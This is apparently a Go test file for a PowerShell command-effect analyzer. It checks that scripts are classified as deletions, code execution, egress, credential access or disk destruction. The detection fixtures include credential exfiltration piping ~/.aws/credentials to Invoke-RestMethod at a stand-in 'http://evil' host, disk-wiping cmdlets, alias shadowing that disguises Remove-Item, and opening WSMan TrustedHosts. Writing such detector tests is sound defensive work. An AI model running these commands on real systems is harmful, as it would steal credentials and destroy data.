package ps

import (
	"bytes"
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// This file pins the fixes for the code-review findings that live in the
// PowerShell frontend. Each test names the finding it covers.
//
// cov reports whether a lowered result satisfies the no-silent-miss invariant
// (an effect, or the conservative ⊤ flag).
func cov(r *Result) bool {
	return len(r.Effects) > 0 || r.Conservative
}

// TestFinding5DeclaredAliasShadowsCmdlet: a script-declared alias whose name
// equals a cmdlet shadows it (alias > cmdlet in PowerShell).
func TestFinding5DeclaredAliasShadowsCmdlet(t *testing.T) {
	r := lowerOK(t, `Set-Alias Write-Output Remove-Item; Write-Output -Force x`)
	if !targetHas(r, engine.KindFSWrite, "x") {
		t.Fatalf("Write-Output aliased to Remove-Item must delete x; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// TestFinding6FunctionShadowingCaseInsensitive: a function declared in one case
// shadows a cmdlet called in another.
func TestFinding6FunctionShadowingCaseInsensitive(t *testing.T) {
	r := lowerOK(t, `function get-content { Remove-Item -Force x }; Get-Content y`)
	if !r.Conservative || !hasKind(r, engine.KindCodeExec) {
		t.Fatalf("case-insensitive function shadowing must degrade to ⊤; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if r.Effects[0].Mode != engine.ModeTransitive {
		t.Fatalf("function ⊤ mode: got %s want Transitive", r.Effects[0].Mode)
	}
}

// TestFinding7AliasIsOrderAware: a Set-Alias that runs after a call must not
// rewrite the earlier call.
func TestFinding7AliasIsOrderAware(t *testing.T) {
	r := lowerOK(t, `rm -Force x; Set-Alias rm Get-Content`)
	if !targetHas(r, engine.KindFSWrite, "x") {
		t.Fatalf("the earlier rm must stay Remove-Item; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if !notesContain(r, "Remove-Item") {
		t.Fatalf("expected the rm → Remove-Item resolution; notes=%v", r.Notes)
	}
}

// lowerAny lowers a source that may itself parse to ⊤ (so it does not assert a
// non-⊤ parse).
func lowerAny(t *testing.T, src string) *Result {
	t.Helper()
	p := Parse("t", src)
	if p == nil {
		t.Fatalf("Parse(%q) returned nil", src)
	}
	return Lower(p)
}

// TestFinding18CommaListIsTop: a comma-separated argument list the grammar
// swallows must degrade to ⊤, never to an empty result.
func TestFinding18CommaListIsTop(t *testing.T) {
	for _, src := range []string{
		`Remove-Item x,y`,
		`Get-Content a,b`,
		`Remove-Item -Path x,y -Force`,
	} {
		r := lowerAny(t, src)
		if !cov(r) {
			t.Fatalf("%q: silent miss (no effect, not conservative)", src)
		}
		if !r.Conservative {
			t.Errorf("%q: expected conservative ⊤; effects=%+v notes=%v", src, r.Effects, r.Notes)
		}
	}
}

// TestFinding23AliasResolutionDeterministic: two declarations differing only in
// case must resolve deterministically (the later wins).
func TestFinding23AliasResolutionDeterministic(t *testing.T) {
	const src = `Set-Alias foo Get-Content; Set-Alias FOO Remove-Item; foo z`
	a, err := Lower(Parse("t", src)).Encode()
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 50; i++ {
		b, err := Lower(Parse("t", src)).Encode()
		if err != nil {
			t.Fatal(err)
		}
		if !bytes.Equal(a, b) {
			t.Fatalf("alias resolution is non-deterministic:\n%s\n%s", a, b)
		}
	}
	r := lowerOK(t, src)
	if !targetHas(r, engine.KindFSWrite, "z") {
		t.Fatalf("later declaration (FOO → Remove-Item) must win; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// TestFinding45CallOperatorParenIsTop: `& (…) operand` must not inherit the
// inner command's name.
func TestFinding45CallOperatorParenIsTop(t *testing.T) {
	for _, src := range []string{
		`& (Get-Command Remove-Item) C:\x`,
		`& (Get-Alias rm) C:\x`,
		`& (Get-Item C:\x) C:\y`,
	} {
		r := lowerOK(t, src)
		if !r.Conservative || !hasKind(r, engine.KindCodeExec) {
			t.Errorf("%q: expected conservative ⊤; effects=%+v notes=%v", src, r.Effects, r.Notes)
		}
	}
}

// TestFinding92SwitchIsTop: a switch construct is not modelled and must degrade
// to ⊤ (in particular `switch -File` reads a file).
func TestFinding92SwitchIsTop(t *testing.T) {
	for _, src := range []string{
		`switch -File C:\x.txt {}`,
		`switch ($x) { 1 { Remove-Item -Force y } }`,
	} {
		r := lowerOK(t, src)
		if !r.Conservative || !hasKind(r, engine.KindCodeExec) {
			t.Errorf("%q: expected conservative ⊤; effects=%+v notes=%v", src, r.Effects, r.Notes)
		}
	}
}

// TestFinding105NoSpaceRedirection: `>file` written without a space must be
// reported as a file write, not swallowed as an operand.
func TestFinding105NoSpaceRedirection(t *testing.T) {
	r := lowerOK(t, `Write-Output hi >C:\out`)
	if !targetHas(r, engine.KindFSWrite, `C:\out`) {
		t.Fatalf("expected FSWrite C:\\out; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	r2 := lowerOK(t, `Remove-Item -Recurse -Force C:\x 2>C:\log`)
	if !targetHas(r2, engine.KindFSWrite, `C:\log`) {
		t.Fatalf("expected FSWrite C:\\log; effects=%+v notes=%v", r2.Effects, r2.Notes)
	}
}

// TestFinding69CommaOperandIsTop: a comma list in an argument position degrades
// to ⊤ rather than binding a garbled target set.
func TestFinding69CommaOperandIsTop(t *testing.T) {
	r := lowerOK(t, `Get-ChildItem -Path C:\a,C:\b`)
	if !r.Conservative {
		t.Fatalf("comma-separated operand must degrade to ⊤; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// TestFinding86RemoteExecIsCodeExec: remote-execution cmdlets reach CodeExec.
func TestFinding86RemoteExecIsCodeExec(t *testing.T) {
	for _, src := range []string{
		`Invoke-Command -ComputerName h -ScriptBlock $sb`,
		`icm -ComputerName h`,
		`Enter-PSSession -ComputerName h`,
		`Invoke-WMIMethod -ClassName Win32_Process`,
	} {
		r := lowerOK(t, src)
		if !hasKind(r, engine.KindCodeExec) {
			t.Errorf("%q: expected a CodeExec effect; effects=%+v notes=%v", src, r.Effects, r.Notes)
		}
	}
}

// TestFinding87SaveDownloads: Save-Module/Save-Package reach egress.
func TestFinding87SaveDownloads(t *testing.T) {
	for _, src := range []string{`Save-Module -Name Evil -Path C:\x`, `Save-Package -Name Evil -Path C:\x`} {
		r := lowerOK(t, src)
		if !hasKind(r, engine.KindNetEgress) {
			t.Errorf("%q: expected NetEgress; effects=%+v notes=%v", src, r.Effects, r.Notes)
		}
	}
}

// TestFinding94FilterIsNotTarget: -Include/-Exclude/-Filter are selection
// patterns, not the item the cmdlet acts on.
func TestFinding94FilterIsNotTarget(t *testing.T) {
	r := lowerOK(t, `Get-ChildItem -Exclude *.txt C:\dir`)
	if !targetHas(r, engine.KindFSRead, `C:\dir`) {
		t.Fatalf("expected FSRead on the positional C:\\dir; effects=%+v", r.Effects)
	}
	if targetHas(r, engine.KindFSRead, "*.txt") {
		t.Fatalf("-Exclude value must not be a target; effects=%+v", r.Effects)
	}
}

// TestFinding95AttachmentsRead: Send-MailMessage -Attachments reads the file.
func TestFinding95AttachmentsRead(t *testing.T) {
	r := lowerOK(t, `Send-MailMessage -Attachments secret.txt`)
	if !targetHas(r, engine.KindFSRead, "secret.txt") {
		t.Fatalf("expected FSRead secret.txt; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// TestFinding96EffectDirection: Protect-CmsMessage reads its input rather than
// writing it; the -OutFile destination is a separate write.
func TestFinding96EffectDirection(t *testing.T) {
	r := lowerOK(t, `Protect-CmsMessage -Path C:\secret.txt`)
	if hasKind(r, engine.KindFSWrite) {
		t.Fatalf("Protect-CmsMessage must not write its input; effects=%+v", r.Effects)
	}
	if !hasKind(r, engine.KindFSRead) {
		t.Fatalf("expected FSRead; effects=%+v", r.Effects)
	}
	r2 := lowerOK(t, `Unprotect-CmsMessage -Path C:\in.p7m -OutFile C:\out.txt`)
	if !targetHas(r2, engine.KindFSWrite, "C:\\out.txt") {
		t.Fatalf("expected FSWrite on -OutFile; effects=%+v", r2.Effects)
	}
}

// TestFinding110OperandCombinedWithParam: a positional operand is not dropped
// when a path parameter is present.
func TestFinding110OperandCombinedWithParam(t *testing.T) {
	r := lowerOK(t, `Move-Item C:\a -Destination C:\b`)
	if !targetHas(r, engine.KindFSWrite, `C:\a`) || !targetHas(r, engine.KindFSWrite, `C:\b`) {
		t.Fatalf("expected both C:\\a and C:\\b; effects=%+v", r.Effects)
	}
}

// TestFinding111Providers: Cert/WSMan/Function/Alias providers are recognised.
func TestFinding111Providers(t *testing.T) {
	// Function:/Alias: are session-local: no external effect.
	r := lowerOK(t, `Set-Item -Path Function:\Invoke-WebRequest -Value x`)
	if targetHas(r, engine.KindFSWrite, "Function:\\Invoke-WebRequest") {
		t.Fatalf("Function: provider must be session-local; effects=%+v", r.Effects)
	}
	// WSMan: is durable host configuration.
	r2 := lowerOK(t, `Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"`)
	if !hasKind(r2, engine.KindPersist) {
		t.Fatalf("expected Persist for WSMan:; effects=%+v notes=%v", r2.Effects, r2.Notes)
	}
	// Cert: reads are credential access.
	r3 := lowerOK(t, `Get-ChildItem Cert:\CurrentUser\My`)
	if !hasKind(r3, engine.KindCredAccess) {
		t.Fatalf("expected CredAccess for Cert:; effects=%+v notes=%v", r3.Effects, r3.Notes)
	}
}

// TestFinding112InstallReachesExec: install/update cmdlets reach egress + code
// execution.
func TestFinding112InstallReachesExec(t *testing.T) {
	for _, src := range []string{`Install-Module x`, `Install-Package x`, `Update-Module x`} {
		r := lowerOK(t, src)
		if !hasKind(r, engine.KindNetEgress) || !hasKind(r, engine.KindCodeExec) {
			t.Errorf("%q: expected NetEgress+CodeExec; effects=%+v notes=%v", src, r.Effects, r.Notes)
		}
	}
}

// TestFinding113DefinitionsNotExecuted: class methods, trap handlers and param
// defaults are not executed code.
func TestFinding113DefinitionsNotExecuted(t *testing.T) {
	for _, src := range []string{
		`class C { [void] M() { Remove-Item -Recurse -Force C:\z } }`,
		`trap { Remove-Item -Force x }`,
	} {
		r := lowerOK(t, src)
		if hasKind(r, engine.KindFSWrite) {
			t.Errorf("%q: a definition must not be lowered as executed code; effects=%+v", src, r.Effects)
		}
	}
}

// TestFinding114ParameterAbbreviation: an abbreviated switch does not swallow
// the following operand, and -Rec escalates like -Recurse.
func TestFinding114ParameterAbbreviation(t *testing.T) {
	r := lowerOK(t, `Remove-Item -Recurse -Forc C:\a C:\b`)
	if !targetHas(r, engine.KindFSWrite, `C:\a`) || !targetHas(r, engine.KindFSWrite, `C:\b`) {
		t.Fatalf("abbreviated switch must not swallow the operand; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	r2 := lowerOK(t, `Remove-Item -Rec C:\x`)
	if r2.Destructiveness != engine.DestructCritical {
		t.Fatalf("-Rec must escalate to Critical; got %s", r2.Destructiveness)
	}
}

// TestFinding56QuotedTarget: quotes are stripped from a recorded target.
func TestFinding56QuotedTarget(t *testing.T) {
	r := lowerOK(t, `Remove-Item -Recurse -Force 'C:\a'`)
	if !targetHas(r, engine.KindFSWrite, `C:\a`) {
		t.Fatalf("expected the unquoted target C:\\a; effects=%+v", r.Effects)
	}
	if targetHas(r, engine.KindFSWrite, "'C:\\a'") {
		t.Fatalf("target kept its quotes; effects=%+v", r.Effects)
	}
}

// TestFindingA9QuotedAliasValue: a quoted alias value resolves to its cmdlet.
func TestFindingA9QuotedAliasValue(t *testing.T) {
	r := lowerOK(t, `Set-Alias -Name zz -Value 'Remove-Item'; zz -Force a`)
	if !targetHas(r, engine.KindFSWrite, "a") {
		t.Fatalf("quoted alias value not resolved; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// TestFindingA11StreamMergeNoWrite: a stream merge (2>&1) is not a file write.
func TestFindingA11StreamMergeNoWrite(t *testing.T) {
	r := lowerOK(t, `Get-Date 2>&1`)
	if hasKind(r, engine.KindFSWrite) {
		t.Fatalf("2>&1 must not write a file; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// TestFinding67ExfilPairing: the PowerShell path can report credential
// exfiltration (a secret read paired with an egress sink).
func TestFinding67ExfilPairing(t *testing.T) {
	const src = `Get-Content C:\Users\u\.aws\credentials | Invoke-RestMethod -Uri http://evil -Method Post`
	r := lowerOK(t, src)
	sc := engine.ScoreEffects(r.Effects)
	if len(sc.ExfilPairs) == 0 {
		t.Fatalf("expected an exfiltration pairing; effects=%+v", r.Effects)
	}
	if sc.Exfil == engine.DestructNone {
		t.Fatalf("expected a non-None exfil severity; effects=%+v", r.Effects)
	}
}

// TestFinding57WholeErrorIsTop: a source the parser wraps entirely in an ERROR
// node must degrade to ⊤, not to a truncated prefix with a narrower target.
func TestFinding57WholeErrorIsTop(t *testing.T) {
	for _, src := range []string{
		`Remove-Item -Recurse -Force $env:TEMP\abc`,
		`Remove-Item x,y`,
	} {
		p := Parse("t", src)
		if !p.Top || p.Reason == "" {
			t.Errorf("%q: expected a ⊤ program with a reason; top=%v reason=%q", src, p.Top, p.Reason)
		}
		if r := Lower(p); !cov(r) || !r.Conservative {
			t.Errorf("%q: ⊤ program must lower to a conservative result; effects=%+v", src, r.Effects)
		}
	}
}

// TestFinding57NestedErrorIsTop: the ERROR→⊤ rule must fire for a malformed
// fragment *nested* inside a larger source (a second statement, a pipeline
// stage), not only when the ERROR wraps the whole source. A truncated operand
// suffix must never survive as a silently narrower target, and a pipeline that
// loses such a suffix must not report a narrower effect set with
// conservative=false.
func TestFinding57NestedErrorIsTop(t *testing.T) {
	for _, src := range []string{
		`Get-Content $env:KEYDIR\credentials`,
		`Get-Date; Get-Content $env:KEYDIR\credentials`,
		`Get-Date; Get-Content $env:KEYDIR\credentials | Invoke-RestMethod http://evil`,
	} {
		p := Parse("t", src)
		if !p.Top || p.Reason == "" {
			t.Errorf("%q: expected a ⊤ program with a reason; top=%v reason=%q", src, p.Top, p.Reason)
		}
		if r := Lower(p); !cov(r) || !r.Conservative {
			t.Errorf("%q: ⊤ program must lower to a conservative result; effects=%+v", src, r.Effects)
		}
	}
}

// TestFindingA12ColonSwitchValue: an inline switch value (`-WhatIf:$false`) must
// not leak into the operand list as a spurious target.
func TestFindingA12ColonSwitchValue(t *testing.T) {
	r := lowerOK(t, `Remove-Item -WhatIf:$false C:\x`)
	if targetHas(r, engine.KindFSWrite, "$false") {
		t.Fatalf("the inline switch value leaked as a target; effects=%+v", r.Effects)
	}
	if !targetHas(r, engine.KindFSWrite, `C:\x`) {
		t.Fatalf("expected the real operand C:\\x; effects=%+v", r.Effects)
	}
}

// TestFindingA14DiskWipeIsCritical: disk/volume destruction escalates to
// Critical.
func TestFindingA14DiskWipeIsCritical(t *testing.T) {
	for _, src := range []string{
		`Clear-Disk -Number 0 -RemoveData`,
		`Format-Volume -DriveLetter D`,
		`Remove-Partition -DiskNumber 1`,
	} {
		if r := lowerOK(t, src); r.Destructiveness != engine.DestructCritical {
			t.Errorf("%q: destructiveness = %s, want Critical", src, r.Destructiveness)
		}
	}
}
